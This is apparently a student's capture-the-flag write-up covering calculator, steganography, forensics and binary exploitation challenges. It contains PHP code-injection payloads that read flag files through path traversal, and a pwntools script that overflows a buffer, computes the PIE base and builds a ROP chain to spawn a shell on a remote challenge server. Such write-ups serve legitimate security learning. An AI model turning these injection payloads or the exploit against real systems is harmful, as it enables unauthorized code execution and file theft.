1) Calcualtor evaluation. 

```php
0;print(echo("head -n 5 flag"))
```

2)Calculator Revaluation 

```php
0;$filename ='../secrets1782956/flag';$handle = fopen($filename,"r");$contents = fread($handle, filesize($filename));fclose($handle);print $contents
```

3) Special Stego 1/2: Inkscape lmao

4) Stego 3: PIL/ref to github

5) Stego 4

```python
#they base64 then binary this piece of shit
from PIL import Image
import base64
#copy original encoding function
with Image.open("VirtualRealitySampleScreenshot.png") as im:
    width, height = im.size
    for i in range(1, 1920):
        extract = []
        try:
            #print(i)
            for x in range(0, width, i):
                for y in range(0, height, i):
                    pixel = list(im.getpixel((x, y)))
                    for n in range(0, 3):
                        extract.append(pixel[n]&1)
            flag = "".join([str(x) for x in extract])
            # copy stackoverflow function time
            chars = []
            for b in range(int(len(flag) / 8)):
                byte = flag[b * 8:(b + 1) * 8]
                chars.append(chr(int(''.join([str(bit) for bit in byte]), 2)))
            output = base64.b64decode(''.join(chars))
            print(output)
                
            
        except:
            continue

flag = 'IRS{Sp3c1AL_L5B_15_alwAy5_v3rY_fuN_AnD_c00l!_G00d_j0b_W3LL_d0n3!}'
```


6) Big Brother Secrets:
        Notice that 1) theres chrome and 2) theres discord open. extract discord, strings find attatchment. hint refers to google ctf 2016 chall, where memdump can be viewed in gimp as raw data. extract chrome, view in gimp, find "password" to attatchment. then lastly just extract pdf objects to find javascript. now im lazy af to decode, so just run in chrome and print out the flag. ez.
        
        
7) Dynamic Library: notice can export function/run with c++

# **BINARY EXPLOITATION**

1) simple BOF, overwrite both username/password, padding, rbp, overwrite rip. 

### Chall 2:
    -Sanity check: bof 8 chars and overwrite integer. jump to chall one (get offset from output of chall).
    -Chall one: shellcode 
```
mov edx , p32(12345678)
```
(basically lower byte since higher byte is already 0 yea)

Then essentially after that flag is given


### Part 2 (ROP/SYSCALL)

```python
from pwn import *
p =  remote("challs.sieberrsec.tech",3031)
context.log_level = 'DEBUG'
#p = process('./refresher')
#pause()

sanity = "A"*8
sanity_jump = "A"*20
p.recvuntil("Can you get through this sanity check?")
p.sendline(sanity + p32(0x73737373))
p.recvuntil("How about this? [") #chall one bois
chall_1_add = int(p.recvuntil("]").strip("]"), 16)
pie_base = chall_1_add - 0x00000000000009c5
challenge_two = pie_base +0x000000000000096d+1 #ask @throwaway right, it just works idk
p.sendline(sanity_jump + p64(challenge_two))

#part 2 Rop start

padd = "A"*8
#rdi 0x0000000000000b93 : pop rdi ; ret
#rsi pop rsi ; pop r15 ; ret
#rdx pop rdx ; syscall

rdi = pie_base + 0x0000000000000b93
rsi = pie_base + 0x0000000000000b91
rdx = pie_base + 0x0000000000000966

binsh = pie_base + 0xbe5
log.info("binsh: " + hex(binsh))

p.sendline("00000059" + "A"*8 + p64(rdi) + p64(binsh) + p64(rsi) +p64(0) + p64(0) + p64(rdx) + p64(0))
p.interactive()
```

Essentially, first 8 bytes control RAX. then next 8 pad to RIP, then just ROPgadget ur way to idk what.